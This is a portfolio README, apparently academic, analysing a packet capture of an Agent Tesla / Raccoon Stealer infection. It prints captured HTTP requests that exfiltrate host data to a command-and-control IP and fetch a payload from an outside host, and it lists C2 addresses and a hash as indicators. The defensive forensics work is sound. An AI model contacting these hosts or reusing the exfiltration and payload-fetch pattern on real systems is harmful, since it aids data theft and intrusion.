<div align="center">

```
███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
        F O R E N S I C S   —   M A L W A R E   &   C 2
```

# 🌐 Network Traffic Investigation — Malware & C2 Analysis

**Case Type:** Network Malware Infection & Command-and-Control Detection  
**Evidence:** `malware-traffic-analysis.pcap`  
**Investigator:** Rohit Aswal · University of Salford

[![Wireshark](https://img.shields.io/badge/Tool-Wireshark-1679A7?style=flat-square&logo=wireshark)](https://www.wireshark.org/)
[![VirusTotal](https://img.shields.io/badge/Tool-VirusTotal-blue?style=flat-square)](https://www.virustotal.com/)
[![AgentTesla](https://img.shields.io/badge/Malware-Agent%20Tesla%20%2F%20Raccoon%20Stealer-red?style=flat-square)]()
[![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-orange?style=flat-square)](https://attack.mitre.org/)

</div>

---

## 📖 Scenario

A network packet capture (`malware-traffic-analysis.pcap`) was analysed following suspicious outbound activity. The goal was to identify malware, map C2 infrastructure, and determine data exfiltration.

---

## 🎯 Investigation Objectives

- [x] Identify malware family  
- [x] Locate C2 servers  
- [x] Extract DLL hash  
- [x] Identify host system  
- [x] Analyse communication  
- [x] Verify via VirusTotal  

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `Wireshark` | Packet analysis |
| `VirusTotal` | IOC verification |
| `HTTP filters` | Traffic filtering |
| `TCP stream` | Reconstruct communication |
| `DNS filters` | Detect beaconing |

---

## 🔬 Methodology

```text
[1] Load PCAP → Wireshark  
[2] Filter HTTP traffic  
[3] Identify suspicious URLs  
[4] Extract C2 IPs  
[5] Verify via VirusTotal  
[6] Extract host details  
[7] Analyse ports & protocols  
[8] Map MITRE ATT&CK
```

---

## 🦠 Malware Identification

### Filter Used
```
http && ip.src == 10.12.19.104
```

### Evidence
```http
POST /rob23/DESKTOP-3KI6Y6G_W10019042.A4801B519365B27E563BF48CAE82BD58/83/ HTTP/1.1
Host: 45.141.59.212
```

### Pattern Insight

```text
campaign / hostname / OS / DLL hash / sequence
```

### Payload Delivery
```http
GET /diego.png HTTP/1.1
Host: 43.240.64.184
```

### ✅ Verdict
**Agent Tesla / Raccoon Stealer**

---

## 🌍 C2 Infrastructure

| Role | IP | Port |
|------|----|------|
| Primary C2 | 45.141.59.212 | 80 |
| Secondary C2 | 186.47.209.222 | 80 |
| Payload Host | 43.240.64.184 | 80 |

---

## 🖥️ Infected Host

| Field | Value |
|------|------|
| Hostname | DESKTOP-3KI6Y6G |
| Windows | 10.0.19042 |
| DLL Hash | A4801B519365B27E563BF48CAE82BD58 |
| Local IP | 10.12.19.104 |

---

## 🔌 Communication Pattern

```text
Infected Host
   ├── HTTP → C2 (45.141.59.212)
   ├── HTTP → Secondary C2
   ├── GET → Payload (diego.png)
   ├── Kerberos → DC (legit)
   ├── LDAP → DC (legit)
   └── SMB → Internal network
```

---

## 📦 IOC Summary

```yaml
c2_ips:
  - 45.141.59.212
  - 186.47.209.222
  - 43.240.64.184

hostname: DESKTOP-3KI6Y6G
dll_hash: A4801B519365B27E563BF48CAE82BD58

exfiltration: HTTP POST
payload: diego.png
```

---

## 🗺️ MITRE ATT&CK

| Technique | Description |
|----------|------------|
| T1071.001 | HTTP |
| T1105 | Tool Transfer |
| T1041 | Exfiltration |
| T1071.004 | DNS |

---

## 🧠 Skills Demonstrated

Network Forensics · PCAP Analysis · C2 Detection · IOC Extraction · Threat Analysis  

---

## ⚠️ Disclaimer

Simulated academic investigation.

---

[← Back to Portfolio](../README.md)
